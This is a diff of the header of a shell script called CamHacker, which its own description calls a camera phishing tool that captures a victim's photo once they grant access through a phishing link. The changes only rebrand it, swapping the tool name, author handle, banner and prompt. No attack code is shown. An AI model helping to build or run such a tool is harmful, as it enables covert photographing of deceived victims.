@@ -2,9 +2,9 @@
 
 # CamHacker
 # Version    : 1.5
-# Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
-# Author     : KasRoudra
-# Github     : https://github.com/KasRoudra
+# Description: CamLuden is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
+# Author     : kasroudrakr
+# Github     : https://github.com/kasroudrakr
 # Email      : kasroudrakrd@gmail.com
 # Credits    : Noob-Hackers, TechChipNet, LinuxChoice
 # Date       : 5-09-2021
@@ -70,7 +70,7 @@ ${cyan}| |   / _' | '_ ' _ \| |_| |/ _' |/ __| |/ / _ \ '__|
 ${purple}| |__| (_| | | | | | |  _  | (_| | (__|   <  __/ |
 ${yellow} \____\__,_|_| |_| |_|_| |_|\__,_|\___|_|\_\___|_|
 ${red}                                            [v${version}]
-${blue}                                    [By KasRoudra]
+${blue}                                    [By Luden]
 "
 
 ngrok_help="
@@ -127,7 +127,7 @@ if command -v brew > /dev/null 2>&1; then
     fi
 fi
 
-ch_prompt="\n${cyan}Cam${nc}@${cyan}Hacker ${red}$ ${nc}"
+ch_prompt="\n${cyan}Cam${nc}@${cyan}Luden ${red}$ ${nc}"
 
 # Kill running instances of required packages
 killer() {
